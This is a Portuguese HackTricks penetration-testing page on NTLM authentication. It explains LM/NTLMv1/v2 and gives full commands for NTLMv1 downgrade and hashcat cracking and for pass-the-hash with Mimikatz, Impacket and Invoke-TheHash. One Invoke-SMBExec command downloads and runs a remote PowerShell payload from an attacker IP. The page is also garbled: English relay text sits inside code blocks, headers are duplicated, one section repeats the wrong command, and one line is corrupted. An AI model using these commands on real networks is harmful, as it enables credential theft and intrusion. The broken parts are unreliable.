# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Trabalha em uma **empresa de cibersegurança**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informações Básicas

**Credenciais NTLM**: Nome do domínio (se houver), nome de usuário e hash da senha.

**LM** está **ativado** apenas no **Windows XP e no servidor 2003** (os hashes LM podem ser quebrados). O hash LM AAD3B435B51404EEAAD3B435B51404EE significa que o LM não está sendo usado (é o hash LM da string vazia).

Por padrão, o **Kerberos** é **usado**, então o NTLM só será usado se **não houver nenhum Active Directory configurado**, o **Domínio não existir**, o **Kerberos não estiver funcionando** (configuração ruim) ou o **cliente** que tenta se conectar usando o IP em vez de um nome de host válido.

Os **pacotes de rede** de uma **autenticação NTLM** têm o **cabeçalho** "**NTLMSSP**".

Os protocolos: LM, NTLMv1 e NTLMv2 são suportados na DLL %windir%\Windows\System32\msv1\_0.dll

## LM, NTLMv1 e NTLMv2

Você pode verificar e configurar qual protocolo será usado:

### GUI

Execute _secpol.msc_ -> Políticas locais -> Opções de segurança -> Segurança de rede: Nível de autenticação do LAN Manager. Existem 6 níveis (de 0 a 5).

![](<../../.gitbook/assets/image (92).png>)

### Registro

Isso definirá o nível 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Valores possíveis:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Esquema básico de autenticação de domínio NTLM

1. O **usuário** introduz suas **credenciais**
2. A máquina cliente **envia uma solicitação de autenticação** enviando o **nome do domínio** e o **nome de usuário**
3. O **servidor** envia o **desafio**
4. O **cliente criptografa** o **desafio** usando o hash da senha como chave e o envia como resposta
5. O **servidor envia** para o **controlador de domínio** o **nome do domínio, o nome de usuário, o desafio e a resposta**. Se **não houver** um Active Directory configurado ou o nome do domínio for o nome do servidor, as credenciais são **verificadas localmente**.
6. O **controlador de domínio verifica se tudo está correto** e envia as informações para o servidor

O **servidor** e o **Controlador de Domínio** são capazes de criar um **Canal Seguro** via servidor **Netlogon** pois o Controlador de Domínio conhece a senha do servidor (ela está dentro do banco de dados **NTDS.DIT**).

### Esquema de autenticação NTLM local

A autenticação é como a mencionada **anteriormente, mas** o **servidor** conhece o **hash do usuário** que tenta se autenticar dentro do arquivo **SAM**. Portanto, em vez de perguntar ao Controlador de Domínio, o **servidor irá verificar por si só** se o usuário pode se autenticar.

### Desafio NTLMv1

O **comprimento do desafio é de 8 bytes** e a **resposta tem 24 bytes** de comprimento.

O **hash NT (16 bytes)** é dividido em **3 partes de 7 bytes cada** (7B + 7B + (2B+0x00\*5)): a **última parte é preenchida com zeros**. Em seguida, o **desafio** é **cifrado separadamente** com cada parte e os bytes cifrados resultantes são **unidos**. Total: 8B + 8B + 8B = 24 bytes.

**Problemas**:

* Falta de **aleatoriedade**
* As 3 partes podem ser **atacadas separadamente** para encontrar o hash NT
* **DES é passível de quebra**
* A 3ª chave é composta sempre por **5 zeros**.
* Dado o **mesmo desafio**, a **resposta** será a **mesma**. Portanto, você pode dar como **desafio** para a vítima a string "**1122334455667788**" e atacar a resposta usando **tabelas arco-íris pré-computadas**.

### Ataque NTLMv1

Atualmente está se tornando menos comum encontrar ambientes com Delegação Irrestrita configurada, mas isso não significa que você não possa **abusar de um serviço de Spooler de Impressão** configurado.

Você poderia abusar de algumas credenciais/sessões que você já tem no AD para **solicitar que a impressora se autentique** contra algum **host sob seu controle**. Em seguida, usando `metasploit auxiliary/server/capture/smb` ou `responder`, você pode **definir o desafio de autenticação como 1122334455667788**, capturar a tentativa de autenticação e, se ela foi feita usando **NTLMv1**, você será capaz de **quebrá-la**.\
Se estiver usando `responder`, você poderia tentar \*\*usar a flag `--lm` \*\* para tentar **rebaixar** a **autenticação**.\
_Obs.: Para essa técnica, a autenticação deve ser feita usando NTLMv1 (NTLMv2 não é válido)._

Lembre-se de que a impressora usará a conta de computador durante a autenticação, e as contas de computador usam **senhas longas e aleatórias** que você **provavelmente não conseguirá quebrar** usando **dicionários comuns**. Mas a autenticação **NTLMv1** **usa DES** ([mais informações aqui](./#ntlmv1-challenge)), então usando alguns serviços especialmente dedicados a quebrar DES você será capaz de quebrá-la (você poderia usar [https://crack.sh/](https://crack.sh) por exemplo).

### Ataque NTLMv1 com hashcat

O NTLMv1 também pode ser quebrado com a Ferramenta Multi NTLMv1 [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) que formata mensagens NTLMv1 de uma maneira que pode ser quebrada com o hashcat.

O comando
```
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
```plaintext
## NTLM Relaying

NTLM relaying is a technique used to relay authentication attempts from one system to another. This can be used to escalate privileges and move laterally within a network. The attacker captures an NTLM authentication attempt and relays it to another system, tricking it into thinking the attacker is the legitimate user. This can be achieved using tools like `Responder` or `Impacket`.

### How to Prevent NTLM Relaying Attacks

To prevent NTLM relaying attacks, you can:
- Disable NTLM authentication in favor of more secure protocols like Kerberos.
- Implement SMB signing to prevent relay attacks on SMB traffic.
- Use Extended Protection for Authentication to protect against relaying attacks.
- Enable LDAP signing and channel binding to protect LDAP communications.
```
```
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# NTLM Hashes

## Overview

NTLM hashes are commonly used in Windows environments for authentication. These hashes can be extracted from the Windows registry or by sniffing network traffic. Once obtained, they can be cracked using tools like `hashcat` or `John the Ripper` to recover the original passwords.

## Protection

To protect against NTLM hash theft, it is recommended to use strong, unique passwords and enable NTLM hashing mitigations such as LDAP server signing, SMB signing, and Extended Protection for Authentication.

## Cracking

When attempting to crack NTLM hashes, it is important to use a good wordlist and rules to increase the chances of success. Tools like `hashcat` offer various attack modes and optimizations for efficient cracking.

## References

- [Hashcat](https://hashcat.net/hashcat/)
- [John the Ripper](https://www.openwall.com/john/)
```
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Execute o hashcat (distribuído é melhor através de uma ferramenta como hashtopolis) pois, caso contrário, isso levará vários dias.
```
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Neste caso, sabemos que a senha é password, então vamos trapacear para fins de demonstração:
```
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Precisamos agora usar as hashcat-utilities para converter as chaves DES quebradas em partes do hash NTLM:
```
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
### NTLM Relay Attack

NTLM relay attacks are a common technique used by attackers to escalate privileges within a network. This attack involves intercepting NTLM authentication traffic and relaying it to a target server to gain unauthorized access. By exploiting NTLM relay vulnerabilities, an attacker can potentially compromise sensitive information and gain control over network resources.

To protect against NTLM relay attacks, it is recommended to implement secure authentication protocols such as Kerberos, enable SMB signing to prevent relay attacks, and disable NTLM where possible. Additionally, enforcing strong password policies and regularly monitoring network traffic for suspicious activity can help mitigate the risk of NTLM relay attacks.
```
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
## NTLM Relay Attack

### Overview

NTLM relay attacks are a common technique used by attackers to exploit the NTLM authentication protocol. This attack involves intercepting an NTLM authentication request from a victim host and relaying it to a target host to gain unauthorized access.

### How it works

1. The attacker intercepts an NTLM authentication request from a victim host.
2. The attacker relays the request to a target host.
3. The target host processes the request, thinking it is coming from the victim host.
4. If successful, the attacker gains unauthorized access to the target host.

### Mitigation

To mitigate NTLM relay attacks, consider implementing the following measures:

- **Enforce SMB Signing**: Require SMB signing to prevent tampering with authentication requests.
- **Enable Extended Protection for Authentication**: Helps protect against NTLM relay attacks by requiring stronger authentication.
- **Use LDAP Signing and Channel Binding**: Helps prevent relay attacks by ensuring the integrity of LDAP traffic.
- **Implement Credential Guard**: Protects NTLM credentials from being stolen and relayed to other hosts.

By implementing these measures, you can significantly reduce the risk of falling victim to NTLM relay attacks.
```
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### Desafio NTLMv2

O **comprimento do desafio é de 8 bytes** e **são enviadas 2 respostas**: Uma tem **24 bytes** de comprimento e o comprimento da **outra** é **variável**.

**A primeira resposta** é criada cifrando usando **HMAC\_MD5** a **string** composta pelo **cliente e o domínio** e usando como **chave** o **hash MD4** do **hash NT**. Em seguida, o **resultado** será usado como **chave** para cifrar usando **HMAC\_MD5** o **desafio**. Para isso, **um desafio do cliente de 8 bytes será adicionado**. Total: 24 B.

A **segunda resposta** é criada usando **vários valores** (um novo desafio do cliente, um **timestamp** para evitar **ataques de repetição**...)

Se você tiver um **pcap que capturou um processo de autenticação bem-sucedido**, você pode seguir este guia para obter o domínio, nome de usuário, desafio e resposta e tentar quebrar a senha: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Depois de obter o hash da vítima**, você pode usá-lo para **se passar por ela**.\
Você precisa usar uma **ferramenta** que irá **realizar** a **autenticação NTLM usando** esse **hash**, **ou** você poderia criar um novo **sessionlogon** e **injetar** esse **hash** dentro do **LSASS**, para que quando qualquer **autenticação NTLM for realizada**, esse **hash será usado**. A última opção é o que o mimikatz faz.

**Por favor, lembre-se de que você também pode realizar ataques Pass-the-Hash usando contas de Computador.**

### **Mimikatz**

**Precisa ser executado como administrador**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Isso iniciará um processo que pertencerá aos usuários que iniciaram o mimikatz, mas internamente no LSASS, as credenciais salvas são as que estão dentro dos parâmetros do mimikatz. Em seguida, você pode acessar recursos de rede como se fosse esse usuário (similar ao truque `runas /netonly`, mas você não precisa saber a senha em texto simples).

### Pass-the-Hash a partir do linux

Você pode obter execução de código em máquinas Windows usando Pass-the-Hash a partir do Linux.\
[**Acesse aqui para aprender como fazer isso.**](../../windows/ntlm/broken-reference/)

### Ferramentas compiladas do Impacket para Windows

Você pode baixar [binários do Impacket para Windows aqui](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (Neste caso, você precisa especificar um comando, cmd.exe e powershell.exe não são válidos para obter um shell interativo)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Existem vários outros binários do Impacket...

### Invoke-TheHash

Você pode obter os scripts do PowerShell daqui: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec

#### Invocar-WMIExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

#### Chamar-SMBClient
```
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

#### Invocar-SMBEnum
```
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Esta função é uma **combinação de todas as outras**. Você pode passar **vários hosts**, **excluir** alguns e **selecionar** a **opção** que deseja usar (_SMBExec, WMIExec, SMBClient, SMBEnum_). Se você selecionar **qualquer** um dos **SMBExec** e **WMIExec** mas **não** fornecer nenhum parâmetro _**Command**_, ele apenas irá **verificar** se você tem **permissões suficientes**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Editor de Credenciais do Windows (WCE)

**Precisa ser executado como administrador**

Esta ferramenta fará a mesma coisa que o mimikatz (modificar a memória do LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Execução remota manual do Windows com nome de usuário e senha

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Extraindo credenciais de um Host do Windows

**Para mais informações sobre** [**como obter credenciais de um host do Windows, você deve ler esta página**](broken-reference)**.**

## NTLM Relay e Responder

**Leia um guia mais detalhado sobre como realizar esses ataques aqui:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Analisando desafios NTLM de uma captura de rede

**Você pode usar** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
